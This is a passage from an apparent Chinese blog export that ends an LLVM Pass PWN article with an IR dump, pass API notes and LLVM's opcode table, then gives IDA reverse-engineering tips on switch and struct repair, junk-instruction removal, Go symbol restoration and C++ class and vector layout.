1024\n  %161 = add nsw i64 %160, 1024\n  %162 = add nsw i64 %161, 1024\n  %163 = add nsw i64 %162, 1024\n  %164 = add nsw i64 %163, 1024\n  %165 = add nsw i64 %164, 1024\n  %166 = add nsw i64 %165, 1024\n  %167 = add nsw i64 %166, 1024\n  %168 = add nsw i64 %167, 1024\n  %169 = add nsw i64 %168, 1024\n  %170 = add nsw i64 %169, 1024\n  %171 = add nsw i64 %170, 1024\n  %172 = add nsw i64 %171, 1024\n  %173 = add nsw i64 %172, 1024\n  %174 = add nsw i64 %173, 1024\n  %175 = add nsw i64 %174, 1024\n  %176 = add nsw i64 %175, 1024\n  %177 = add nsw i64 %176, 1024\n  %178 = add nsw i64 %177, 1024\n  %179 = add nsw i64 %178, 1024\n  %180 = add nsw i64 %179, 1024\n  %181 = add nsw i64 %180, 1024\n  %182 = add nsw i64 %181, 1024\n  %183 = add nsw i64 %182, 1024\n  %184 = add nsw i64 %183, 1024\n  %185 = add nsw i64 %184, 1024\n  %186 = add nsw i64 %185, 1024\n  %187 = add nsw i64 %186, 1024\n  %188 = add nsw i64 %187, 1024\n  %189 = add nsw i64 %188, 1024\n  %190 = add nsw i64 %189, 1024\n  %191 = add nsw i64 %190, 1024\n  %192 = add nsw i64 %191, 1024\n  %193 = add nsw i64 %192, 1024\n  %194 = add nsw i64 %193, 1024\n  %195 = add nsw i64 %194, 1024\n  %196 = add nsw i64 %195, 1024\n  %197 = add nsw i64 %196, 1024\n  %198 = add nsw i64 %197, 1024\n  %199 = add nsw i64 %198, 1024\n  %200 = add nsw i64 %199, 1024\n  %201 = add nsw i64 %200, 1024\n  %202 = add nsw i64 %201, 1024\n  %203 = add nsw i64 %202, 1024\n  %204 = add nsw i64 %203, 1024\n  %205 = add nsw i64 %204, 1024\n  %206 = add nsw i64 %205, 1024\n  %207 = add nsw i64 %206, 1024\n  %208 = add nsw i64 %207, 1024\n  %209 = add nsw i64 %208, 1024\n  %210 = add nsw i64 %209, 1024\n  %211 = add nsw i64 %210, 1024\n  %212 = add nsw i64 %211, 1024\n  %213 = add nsw i64 %212, 1024\n  %214 = add nsw i64 %213, 1024\n  %215 = add nsw i64 %214, 1024\n  %216 = add nsw i64 %215, 1024\n  %217 = add nsw i64 %216, 1024\n  %218 = add nsw i64 %217, 1024\n  %219 = add nsw i64 %218, 1024\n  %220 = add nsw i64 %219, 1024\n  %221 = add nsw i64 %220, 1024\n  %222 = add nsw i64 %221, 1024\n  %223 = add nsw i64 %222, 1024\n  %224 = add nsw i64 %223, 1024\n  %225 = add nsw i64 %224, 1024\n  %226 = add nsw i64 %225, 1024\n  %227 = add nsw i64 %226, 1024\n  %228 = add nsw i64 %227, 1024\n  %229 = add nsw i64 %228, 1024\n  %230 = add nsw i64 %229, 1024\n  %231 = add nsw i64 %230, 1024\n  %232 = add nsw i64 %231, 1024\n  %233 = add nsw i64 %232, 1024\n  %234 = add nsw i64 %233, 1024\n  %235 = add nsw i64 %234, 1024\n  %236 = add nsw i64 %235, 1024\n  %237 = add nsw i64 %236, 1024\n  %238 = add nsw i64 %237, 1024\n  %239 = add nsw i64 %238, 1024\n  %240 = add nsw i64 %239, 1024\n  %241 = add nsw i64 %240, 1024\n  %242 = add nsw i64 %241, 1024\n  %243 = add nsw i64 %242, 1024\n  %244 = add nsw i64 %243, 1024\n  %245 = add nsw i64 %244, 1024\n  %246 = add nsw i64 %245, 1024\n  %247 = add nsw i64 %246, 1024\n  %248 = add nsw i64 %247, 1024\n  %249 = add nsw i64 %248, 1024\n  %250 = add nsw i64 %249, 1024\n  %251 = add nsw i64 %250, 1024\n  %252 = add nsw i64 %251, 1024\n  %253 = add nsw i64 %252, 1024\n  %254 = add nsw i64 %253, 1024\n  %255 = add nsw i64 %254, 1024\n  %256 = add nsw i64 %255, 1024\n  %257 = add nsw i64 %256, 1024\n  %258 = add nsw i64 %257, 1024\n  %259 = add nsw i64 %258, 1024\n  %260 = add nsw i64 %259, 1024\n  %261 = add nsw i64 %260, 1024\n  %262 = add nsw i64 %261, 1024\n  %263 = add nsw i64 %262, 1024\n  %264 = add nsw i64 %263, 1024\n  %265 = add nsw i64 %264, 1024\n  %266 = add nsw i64 %265, 1024\n  %267 = add nsw i64 %266, 1024\n  %268 = add nsw i64 %267, 1024\n  %269 = add nsw i64 %268, 1024\n  %270 = add nsw i64 %269, 1024\n  %271 = add nsw i64 %270, 1024\n  %272 = add nsw i64 %271, 1024\n  %273 = add nsw i64 %272, 1024\n  %274 = add nsw i64 %273, 1024\n  %275 = add nsw i64 %274, 1024\n  %276 = add nsw i64 %275, 1024\n  %277 = add nsw i64 %276, 1024\n  %278 = add nsw i64 %277, 1024\n  %279 = add nsw i64 %278, 1024\n  %280 = add nsw i64 %279, 1024\n  %281 = add nsw i64 %280, 1024\n  %282 = add nsw i64 %281, 1024\n  %283 = add nsw i64 %282, 1024\n  %284 = add nsw i64 %283, 1024\n  %285 = add nsw i64 %284, 1024\n  %286 = add nsw i64 %285, 1024\n  %287 = add nsw i64 %286, 1024\n  %288 = add nsw i64 %287, 1024\n  %289 = add nsw i64 %288, 1024\n  %290 = add nsw i64 %289, 1024\n  %291 = add nsw i64 %290, 1024\n  %292 = add nsw i64 %291, 1024\n  %293 = add nsw i64 %292, 1024\n  %294 = add nsw i64 %293, 1024\n  %295 = add nsw i64 %294, 1024\n  %296 = add nsw i64 %295, 1024\n  %297 = add nsw i64 %296, 1024\n  %298 = add nsw i64 %297, 1024\n  %299 = add nsw i64 %298, 1024\n  %300 = add nsw i64 %299, 1024\n  %301 = add nsw i64 %300, 1024\n  %302 = add nsw i64 %301, 1024\n  %303 = add nsw i64 %302, 1024\n  %304 = add nsw i64 %303, 1024\n  %305 = add nsw i64 %304, 1024\n  %306 = add nsw i64 %305, 1024\n  %307 = add nsw i64 %306, 1024\n  %308 = add nsw i64 %307, 1024\n  %309 = add nsw i64 %308, 1024\n  %310 = add nsw i64 %309, 1024\n  %311 = add nsw i64 %310, 1024\n  %312 = add nsw i64 %311, 1024\n  %313 = add nsw i64 %312, 1024\n  %314 = add nsw i64 %313, 1024\n  %315 = add nsw i64 %314, 1024\n  %316 = add nsw i64 %315, 1024\n  %317 = add nsw i64 %316, 1024\n  %318 = add nsw i64 %317, 1024\n  ret i64 %318\n}\n \nattributes #0 = { noinline nounwind optnone uwtable \"disable-tail-calls\"=\"false\" \"frame-pointer\"=\"all\" \"less-precise-fpmad\"=\"false\" \"min-legal-vector-width\"=\"0\" \"no-infs-fp-math\"=\"false\" \"no-jump-tables\"=\"false\" \"no-nans-fp-math\"=\"false\" \"no-signed-zeros-fp-math\"=\"false\" \"no-trapping-math\"=\"true\" \"stack-protector-buffer-size\"=\"8\" \"target-cpu\"=\"x86-64\" \"target-features\"=\"+cx8,+fxsr,+mmx,+sse,+sse2,+x87\" \"tune-cpu\"=\"generic\" \"unsafe-fp-math\"=\"false\" \"use-soft-float\"=\"false\" }\n \n!llvm.module.flags = !{!0}\n!llvm.ident = !{!1}\n \n!0 = !{i32 1, !\"wchar_size\", i32 4}\n!1 = !{!\"Ubuntu clang version 12.0.0-3ubuntu1~20.04.5\"}\n```\n\n\n\n\n\n# 常见用法\n\n1. `getName()`函数用于获取当前`runOnFunction`正处理的函数名\n\n2. 第一个`for`循环是对当前处理的函数中的基本块（比如一些条件分支语句就会产生多个基本块，在生成的`ll`文件中，不同基本块之间会有换行）遍历，第二个`for`循环是对每个基本块中的指令遍历\n\n3. `getOpcodeName()`函数用于获取指令的操作符的名称，\n   \n3. `getNumOperands()`用于获取指令的操作数的个数，\n   \n3. `getOpcode()`函数用于获取指令的操作符编号，在`/usr/include/llvm-xx/llvm/IR/Instruction.def`\n   \n   文件中有对应表，`56`号对应着`Call`这个操作符：\n\n4. `getCalledFunction()`函数用于获取被调用的函数名称，即当在一个`A`函数中调用了`B`函数，在`LLVM IR`中，`A`会通过`Call`操作符调用`B`，`getCalledFunction()`函数就是用于获取此处`B`函数的名称\n\n5. `getOperand(i)`是用于获取第`i`个操作数（在这里就是获取所调用函数的第`i`个参数），`getArgOperand()`函数与其用法类似，但只能获取参数，`getZExtValue()`即`get Zero Extended Value`，也就是将获取的操作数转为无符号扩展整数\n\n6. 最内层`for`循环中的`instIter->getNumOperands()-1`，这里需要`-1`是因为对于`call`和`invoke`操作符，操作数的数量是实际参数的个数`+1`（因为将被调用函数本身也当成了操作数）\n\n7. `if (isa<ConstantInt>(call_inst->getOperand(i)))`这行语句是通过`isa`判断当前获取到的操作数是不是立即数（`ConstantInt`）\n\n10. `static RegisterPass<Hello> X(\"Hello\", \"Hello World Pass\");`中的第一个参数就是注册的`PASS`名称\n\n11. `getTerminator()`是取基本块中末尾的指令\n\n12. `llvm::isa<llvm::Constant,llvm::Value *>(&Operand) & 1`判断操作数`operand`是否为常数。\n\n13. `llvm::isa<llvm::Argument,llvm::Value *>(&Operand) & 1`判断操作数`operand`是否为函数参数。\n\n8. 自定义函数，类似这种`anonymous namespace`基本都是出题人自定义的函数，这种是没有去除符号显示出来的。\n\n![image-20230831091823396](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831091823396.png)\n\n\n\n\n\n# 附录\n\n```c\n//v10 版本\n//===-- llvm/Instruction.def - File that describes Instructions -*- C++ -*-===//\n//\n// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.\n// See https://llvm.org/LICENSE.txt for license information.\n// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n//\n//===----------------------------------------------------------------------===//\n//\n// This file contains descriptions of the various LLVM instructions.  This is\n// used as a central place for enumerating the different instructions and\n// should eventually be the place to put comments about the instructions.\n//\n//===----------------------------------------------------------------------===//\n\n// NOTE: NO INCLUDE GUARD DESIRED!\n\n// Provide definitions of macros so that users of this file do not have to\n// define everything to use it...\n//\n#ifndef FIRST_TERM_INST\n#define FIRST_TERM_INST(num)\n#endif\n#ifndef HANDLE_TERM_INST\n#ifndef HANDLE_INST\n#define HANDLE_TERM_INST(num, opcode, Class)\n#else\n#define HANDLE_TERM_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)\n#endif\n#endif\n#ifndef LAST_TERM_INST\n#define LAST_TERM_INST(num)\n#endif\n\n#ifndef FIRST_UNARY_INST\n#define FIRST_UNARY_INST(num)\n#endif\n#ifndef HANDLE_UNARY_INST\n#ifndef HANDLE_INST\n#define HANDLE_UNARY_INST(num, opcode, instclass)\n#else\n#define HANDLE_UNARY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)\n#endif\n#endif\n#ifndef LAST_UNARY_INST\n#define LAST_UNARY_INST(num)\n#endif\n\n#ifndef FIRST_BINARY_INST\n#define FIRST_BINARY_INST(num)\n#endif\n#ifndef HANDLE_BINARY_INST\n#ifndef HANDLE_INST\n#define HANDLE_BINARY_INST(num, opcode, instclass)\n#else\n#define HANDLE_BINARY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)\n#endif\n#endif\n#ifndef LAST_BINARY_INST\n#define LAST_BINARY_INST(num)\n#endif\n\n#ifndef FIRST_MEMORY_INST\n#define FIRST_MEMORY_INST(num)\n#endif\n#ifndef HANDLE_MEMORY_INST\n#ifndef HANDLE_INST\n#define HANDLE_MEMORY_INST(num, opcode, Class)\n#else\n#define HANDLE_MEMORY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)\n#endif\n#endif\n#ifndef LAST_MEMORY_INST\n#define LAST_MEMORY_INST(num)\n#endif\n\n#ifndef FIRST_CAST_INST\n#define FIRST_CAST_INST(num)\n#endif\n#ifndef HANDLE_CAST_INST\n#ifndef HANDLE_INST\n#define HANDLE_CAST_INST(num, opcode, Class)\n#else\n#define HANDLE_CAST_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)\n#endif\n#endif\n#ifndef LAST_CAST_INST\n#define LAST_CAST_INST(num)\n#endif\n\n#ifndef FIRST_FUNCLETPAD_INST\n#define FIRST_FUNCLETPAD_INST(num)\n#endif\n#ifndef HANDLE_FUNCLETPAD_INST\n#ifndef HANDLE_INST\n#define HANDLE_FUNCLETPAD_INST(num, opcode, Class)\n#else\n#define HANDLE_FUNCLETPAD_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)\n#endif\n#endif\n#ifndef LAST_FUNCLETPAD_INST\n#define LAST_FUNCLETPAD_INST(num)\n#endif\n\n#ifndef FIRST_OTHER_INST\n#define FIRST_OTHER_INST(num)\n#endif\n#ifndef HANDLE_OTHER_INST\n#ifndef HANDLE_INST\n#define HANDLE_OTHER_INST(num, opcode, Class)\n#else\n#define HANDLE_OTHER_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)\n#endif\n#endif\n#ifndef LAST_OTHER_INST\n#define LAST_OTHER_INST(num)\n#endif\n\n#ifndef HANDLE_USER_INST\n#define HANDLE_USER_INST(num, opc, Class) HANDLE_OTHER_INST(num, opc, Class)\n#endif\n\n// Terminator Instructions - These instructions are used to terminate a basic\n// block of the program.   Every basic block must end with one of these\n// instructions for it to be a well formed basic block.\n//\n FIRST_TERM_INST  ( 1)\nHANDLE_TERM_INST  ( 1, Ret           , ReturnInst)\nHANDLE_TERM_INST  ( 2, Br            , BranchInst)\nHANDLE_TERM_INST  ( 3, Switch        , SwitchInst)\nHANDLE_TERM_INST  ( 4, IndirectBr    , IndirectBrInst)\nHANDLE_TERM_INST  ( 5, Invoke        , InvokeInst)\nHANDLE_TERM_INST  ( 6, Resume        , ResumeInst)\nHANDLE_TERM_INST  ( 7, Unreachable   , UnreachableInst)\nHANDLE_TERM_INST  ( 8, CleanupRet    , CleanupReturnInst)\nHANDLE_TERM_INST  ( 9, CatchRet      , CatchReturnInst)\nHANDLE_TERM_INST  (10, CatchSwitch   , CatchSwitchInst)\nHANDLE_TERM_INST  (11, CallBr        , CallBrInst) // A call-site terminator\n  LAST_TERM_INST  (11)\n\n// Standard unary operators...\n FIRST_UNARY_INST(12)\nHANDLE_UNARY_INST(12, FNeg  , UnaryOperator)\n  LAST_UNARY_INST(12)\n\n// Standard binary operators...\n FIRST_BINARY_INST(13)\nHANDLE_BINARY_INST(13, Add  , BinaryOperator)\nHANDLE_BINARY_INST(14, FAdd , BinaryOperator)\nHANDLE_BINARY_INST(15, Sub  , BinaryOperator)\nHANDLE_BINARY_INST(16, FSub , BinaryOperator)\nHANDLE_BINARY_INST(17, Mul  , BinaryOperator)\nHANDLE_BINARY_INST(18, FMul , BinaryOperator)\nHANDLE_BINARY_INST(19, UDiv , BinaryOperator)\nHANDLE_BINARY_INST(20, SDiv , BinaryOperator)\nHANDLE_BINARY_INST(21, FDiv , BinaryOperator)\nHANDLE_BINARY_INST(22, URem , BinaryOperator)\nHANDLE_BINARY_INST(23, SRem , BinaryOperator)\nHANDLE_BINARY_INST(24, FRem , BinaryOperator)\n\n// Logical operators (integer operands)\nHANDLE_BINARY_INST(25, Shl  , BinaryOperator) // Shift left  (logical)\nHANDLE_BINARY_INST(26, LShr , BinaryOperator) // Shift right (logical)\nHANDLE_BINARY_INST(27, AShr , BinaryOperator) // Shift right (arithmetic)\nHANDLE_BINARY_INST(28, And  , BinaryOperator)\nHANDLE_BINARY_INST(29, Or   , BinaryOperator)\nHANDLE_BINARY_INST(30, Xor  , BinaryOperator)\n  LAST_BINARY_INST(30)\n\n// Memory operators...\n FIRST_MEMORY_INST(31)\nHANDLE_MEMORY_INST(31, Alloca, AllocaInst)  // Stack management\nHANDLE_MEMORY_INST(32, Load  , LoadInst  )  // Memory manipulation instrs\nHANDLE_MEMORY_INST(33, Store , StoreInst )\nHANDLE_MEMORY_INST(34, GetElementPtr, GetElementPtrInst)\nHANDLE_MEMORY_INST(35, Fence , FenceInst )\nHANDLE_MEMORY_INST(36, AtomicCmpXchg , AtomicCmpXchgInst )\nHANDLE_MEMORY_INST(37, AtomicRMW , AtomicRMWInst )\n  LAST_MEMORY_INST(37)\n\n// Cast operators ...\n// NOTE: The order matters here because CastInst::isEliminableCastPair\n// NOTE: (see Instructions.cpp) encodes a table based on this ordering.\n FIRST_CAST_INST(38)\nHANDLE_CAST_INST(38, Trunc   , TruncInst   )  // Truncate integers\nHANDLE_CAST_INST(39, ZExt    , ZExtInst    )  // Zero extend integers\nHANDLE_CAST_INST(40, SExt    , SExtInst    )  // Sign extend integers\nHANDLE_CAST_INST(41, FPToUI  , FPToUIInst  )  // floating point -> UInt\nHANDLE_CAST_INST(42, FPToSI  , FPToSIInst  )  // floating point -> SInt\nHANDLE_CAST_INST(43, UIToFP  , UIToFPInst  )  // UInt -> floating point\nHANDLE_CAST_INST(44, SIToFP  , SIToFPInst  )  // SInt -> floating point\nHANDLE_CAST_INST(45, FPTrunc , FPTruncInst )  // Truncate floating point\nHANDLE_CAST_INST(46, FPExt   , FPExtInst   )  // Extend floating point\nHANDLE_CAST_INST(47, PtrToInt, PtrToIntInst)  // Pointer -> Integer\nHANDLE_CAST_INST(48, IntToPtr, IntToPtrInst)  // Integer -> Pointer\nHANDLE_CAST_INST(49, BitCast , BitCastInst )  // Type cast\nHANDLE_CAST_INST(50, AddrSpaceCast, AddrSpaceCastInst)  // addrspace cast\n  LAST_CAST_INST(50)\n\n FIRST_FUNCLETPAD_INST(51)\nHANDLE_FUNCLETPAD_INST(51, CleanupPad, CleanupPadInst)\nHANDLE_FUNCLETPAD_INST(52, CatchPad  , CatchPadInst)\n  LAST_FUNCLETPAD_INST(52)\n\n// Other operators...\n FIRST_OTHER_INST(53)\nHANDLE_OTHER_INST(53, ICmp   , ICmpInst   )  // Integer comparison instruction\nHANDLE_OTHER_INST(54, FCmp   , FCmpInst   )  // Floating point comparison instr.\nHANDLE_OTHER_INST(55, PHI    , PHINode    )  // PHI node instruction\nHANDLE_OTHER_INST(56, Call   , CallInst   )  // Call a function\nHANDLE_OTHER_INST(57, Select , SelectInst )  // select instruction\nHANDLE_USER_INST (58, UserOp1, Instruction)  // May be used internally in a pass\nHANDLE_USER_INST (59, UserOp2, Instruction)  // Internal to passes only\nHANDLE_OTHER_INST(60, VAArg  , VAArgInst  )  // vaarg instruction\nHANDLE_OTHER_INST(61, ExtractElement, ExtractElementInst)// extract from vector\nHANDLE_OTHER_INST(62, InsertElement, InsertElementInst)  // insert into vector\nHANDLE_OTHER_INST(63, ShuffleVector, ShuffleVectorInst)  // shuffle two vectors.\nHANDLE_OTHER_INST(64, ExtractValue, ExtractValueInst)// extract from aggregate\nHANDLE_OTHER_INST(65, InsertValue, InsertValueInst)  // insert into aggregate\nHANDLE_OTHER_INST(66, LandingPad, LandingPadInst)  // Landing pad instruction.\nHANDLE_OTHER_INST(67, Freeze, FreezeInst) // Freeze instruction.\n  LAST_OTHER_INST(67)\n\n#undef  FIRST_TERM_INST\n#undef HANDLE_TERM_INST\n#undef   LAST_TERM_INST\n\n#undef  FIRST_UNARY_INST\n#undef HANDLE_UNARY_INST\n#undef   LAST_UNARY_INST\n\n#undef  FIRST_BINARY_INST\n#undef HANDLE_BINARY_INST\n#undef   LAST_BINARY_INST\n\n#undef  FIRST_MEMORY_INST\n#undef HANDLE_MEMORY_INST\n#undef   LAST_MEMORY_INST\n\n#undef  FIRST_CAST_INST\n#undef HANDLE_CAST_INST\n#undef   LAST_CAST_INST\n\n#undef  FIRST_FUNCLETPAD_INST\n#undef HANDLE_FUNCLETPAD_INST\n#undef   LAST_FUNCLETPAD_INST\n\n#undef  FIRST_OTHER_INST\n#undef HANDLE_OTHER_INST\n#undef   LAST_OTHER_INST\n\n#undef HANDLE_USER_INST\n\n#ifdef HANDLE_INST\n#undef HANDLE_INST\n#endif\n\n```\n\n\n\n\n\n# 参考：\n\n[[原创\\] LLVM PASS PWN 总结-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_9)\n","tags":["LLVM"],"categories":["PWN","LLVM"]},{"title":"IDA逆向技巧","url":"/2023/04/22/IDA逆向技巧/","content":"\n\n\n\n# 一、修复switch\n\nC++程序用IDA打开好多都不能将switch识别成功，常常需要修复：\n\n## 1.找到跳转地址\n\n常常反汇编之后如下，这个基本就是无法识别switch的时候了\n\n```c\n__asm { jmp     rax }\n```\n\n## 2.汇编修改\n\n![Snipaste_2021-09-06_16-18-58](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906161913.png)\n\n进入到**unk_41D4**，里面放着对应的跳转数据\n\n![image-20210906165238427](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906165238.png)\n\n按d以4字节为一组对应修改为如下，可见跳转数量有6个\n\n![image-20210906165538977](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906165539.png)\n\n然后对应修改数据\n\n**Edit->Other->Specify switch idiom**\n\n![Snipaste_2021-09-06_16-47-27](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906164744.png)\n\n打开之后修改对应数据\n\n![image-20210906170243406](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906170243.png)\n\n其中默认跳转位置可以通过调试看输入其他的选项的跳转位置。\n\n\n\n# 二、结构体修复\n\n## 1.Local Type插入\n\n**View->Open subviews->Local_types**\n\n![image-20210906170904828](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906170904.png)\n\n右键Insert输入对应结构体即可\n\n![image-20210906172736186](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906172736.png)\n\n## 2.修改为指针\n\n在对应变量按y修改为对应指针\n\n![image-20210906172907718](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906172907.png)\n\n\n\n# 三、反汇编解析错误\n\n## 1.花指令\n\nIDA中调试出现如下错误，或者观察也知道\n\n![image-20211203163504409](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211203163504.png)\n\n这时候可能出现花指令，使得IDA无法正常识别，再往下走IDA跳转到`0x40102f`，则证明`0x40102c~0x40102e`这三个字节码都是无效的，直接nop掉，然后`patch`之后重新打开IDA即可正常识别\n\n![image-20211203164003865](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211203164003.png)\n\n以`2020De1CTF-mixture`为例，IDA打开找到zif_类函数，可以看到堆栈指针问题\n\n![image-20220215114506575](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202151145621.png)\n\n那么可能存在花指令或其他的影响，可以参考如下两种方法\n\n### (1)堆栈寄存器\n\n首先考虑调试看看堆栈寄存器的变化，如下\n\n![image-20220215120401490](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202151204618.png)\n\n可以看到，在执行从0x122E~0x124D这个代码块之前和之后的寄存器除了rip其他都没有改变。\n\n栈环境除了rsp的值被改变了其他的没有什么影响，而对于栈来说，主要就是栈指针的移动和传入参数的压栈，首先栈指针并没有发生改变，在考虑传入参数的压栈。\n\n传入的参数为如下两个参数rdi和rsi，并且最开始的汇编代码并没有对rdi和rsi进行操作，那么这段代码块就等于无效，相当于就是一个`jz 0x124e`，那么我们直接给他nop掉即可\n\n![image-20220215121425597](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202151214636.png)\n\n### (2)看汇编\n\n0x122e~0x124d如下\n\n![image-20220215122155647](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202151221701.png)\n\n可以发现，call l2之后，l2函数通过rax把l2函数的返回地址+8了，也就是从0x1245变成了0x124d，那么就等同于如下代码\n\n```\n.text:000000000000122E                 push    rax\n.text:000000000000122F                 xor     rax, rax\n\n.text:0000000000001236                 pop     rax\n.text:0000000000001237                 mov     [rsp+98h+arg], 0\n.text:000000000000123F                 push    rax\n\n\n.text:000000000000124D                 pop     rax\n```\n\n这不就相当于啥也没做吗，只是有个`mov     [rsp+98h+arg], 0`操作而已，但是也不影响参数，等同没有。\n\n之后的0x131E~0x132D也是一样的错误，直接nop掉即可。之后即可正常F5\n\n![image-20220215125030353](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202151250416.png)\n\n\n\n# 四、go语言隐藏\n\n虎符杯2022 gogogo\n\n现有插件或者IDA7.6对go的符号恢复是基于gopclntab段上保留的函数符号，那么如果将该段上的符号函数进行修改或者隐藏，就不太容易逆向了\n\n![image-20220324174816395](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203241748490.png)\n\n该题就是将main.main和math.init符号表替换，然后在main.main中设置一些原本main函数输入0x12345678退出的功能，使得逆向时我们认为main.main函数就只有这个功能，并没有其他功能，导致无法进行漏洞分析，修改回来就可以了，直接改这个表`.gopclntab`即可\n\n\n\n# 五、C++逆向\n\n## 1.自定义的类\n\n```c++\nclass A {\n  public:\n   A(){\n    printf(\"A::A()\\n\");\n    id = 42;\n   }\n   virtual void a(){\n     printf(\"Virtual A::a()\\n\");\n   }\n   virtual ~A(){\n     printf(\"A::~A()\\n\");\n   }\n   private:\n    int id;\n};\n\nclass B : public A {\n  public:\n    B(){\n      printf(\"B::B()\\n\");\n    }\n    virtual ~B(){\n      printf(\"B::~B()\\n\");\n    }\n    virtual void a(){\n      printf(\"Virtual B::a()\\n\");\n      A::a();\n    }\n    virtual void b(){\n        printf(\"Virtual B::b()\\n\");\n        A::a();\n    }\n};\n```\n\n### (1)类的内存分布\n\n#### ①没有父类的\n\n用上述代码的`class A`来举例\n\n![未命名文件 (14)](https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%20(14).png)\n\n在调用构造函数`A::A()`之前会从堆里申请一块空间，即`class A`的空间，包括指针和成员。\n\n![image-20220423210047186](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220423210047186.png)\n\n在`A::A()`构造函数调用之后会初始化该堆空间，申请的堆空间如下。\n\n![image-20220423212133886](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220423212133886.png)\n\n然后还需要注意的是有两个函数指针，析构函数指针1和析构函数指针2，其中析构函数指针2是实际的用来释放空间的函数，即原始的析构函数，并且其中会调用到析构函数指针1，即用户自定义的析构函数相关的代码，并且地址是连在一起的，如下所示。\n\n![image-20220423211833831](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220423211833831.png)\n\n#### ②有父类的\n\n以上述代码的`class B`来举例\n\n![未命名文件 (15)](https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%20(15).png)\n\n其他的和没有父类的class也是差不多的。\n\n#### ③未申请空间的类\n\n比如`A obj_a;`这种写法，那么其`public`的成员会变成栈上的变量，`private`成员无法访问，访问其成员函数还是在.text段上对应的。\n\n\n\n### (2)常规写法\n\n- `A *point_obj_A = new A;` ：会调用A的构造函数\n\n  `A *point_obj_A = new(A);` ：同上，一样的\n\n- `A obj_A;` ：A的构造函数调用之后，如果没有其他的操作，那么程序会自动释放该对象，调用析构函数，相当于局部变量。\n\n  ![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220423173148441.png)\n\n- `B *point_obj_b = new B;`会先调用A的构造函数，然后再调用B的构造函数，和前面的指针没有太多关系，直接`B obj_B`也是一样的\n\n- `A *point_obj_b = new B;`一样的，只是将`point_obj_b `标记为类型为A的指针，但是这样的话该对象指针`point_obj_b`就不能调用到子类B的函数`b()`了。(子类指针可以调用父类的函数，但是父类指针不能调用子类的特有函数)\n\n\n\n## 2.容器类Vector\n\n### (1)容器创建\n\n参考：[C++逆向之容器vector篇入门 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/176870)\n\n#### ①声明容器\n\n```c\nvector<int> test1;\n\n//对应IDA代码\nstd::vector<int>::vector(v8, argv, envp);\n```\n\n这个不造成堆空间的分配\n\n#### ②声明并初始化大小\n\n```c\nvector<int> test2(5);\n\n//对应IDA代码\nstd::allocator<int>::allocator(v13);\nstd::vector<int>::vector(v9, 5LL, v13);\nstd::allocator<int>::~allocator(v13);\n```\n\n这个在调用vector的构造函数时，会有堆空间的申请，用来存放容器内的数据，依据定义的大小来进行申请，比如这里就申请了5个int的变量，那么大小为5*4=20个字节，对应在堆空间里就需要申请0x20大小的堆块来存放。\n\n![image-20220424112805438](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424112805438.png)\n\n使用malloc来申请\n\n![image-20220424112952718](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424112952718.png)\n\n#### ③声明并初始化大小和值\n\n容量+初始值模式\n\n```c\nvector<int> test3(10,1);\n\n//对应IDA代码\nstd::allocator<int>::allocator(v12);\nv13[0] = 1;\nstd::vector<int>::vector(v10, 10LL, v13, v12);\nstd::allocator<int>::~allocator(v12);\n```\n\n可以看到也是类似的，会创建一个局部变量v13作为初始值1传入vector的构造函数，并且申请堆空间后会进行初始化，所需大小为10*4=40个字节，对应0x30的堆空间，并且会初始化为1，如下所示。\n\n![image-20220424113519816](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424113519816.png)\n\n相关寄存器如下\n\n![image-20220424120832499](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424120832499.png)\n\n#### ④使用地址进行初始化\n\nBegin+End模式\n\n这里区别于之前的传值，即容量的值以及初始值的地址，取而代之的是数据的起始地址和结束地址。\n\n```c\n//传入test3在堆申请的存放数据的起始堆地址和结束堆地址，依据这段数据来进行初始化\nvector<int> test5(test3.begin(), test3.end());\ngetchar();\n\n//对应的传入两个地址进行初始化，即array的相关数据处的地址\nint array[5] = {1, 2, 3, 4, 5};\nvector<int> test6(&array[1], &array[4]);\ngetchar();\n----------------------------------------------------------------------\n//对应IDA代码\nstd::allocator<int>::allocator(v17, 1LL, v5);\nv6 = std::vector<int>::end(v14);\nv7 = std::vector<int>::begin(v14);\nstd::vector<int>::vector<__gnu_cxx::__normal_iterator<int *,std::vector<int>>,void>(v16, v7, v6, v17);\nstd::allocator<int>::~allocator(v17);\ngetchar();\n\n\nv17[8] = 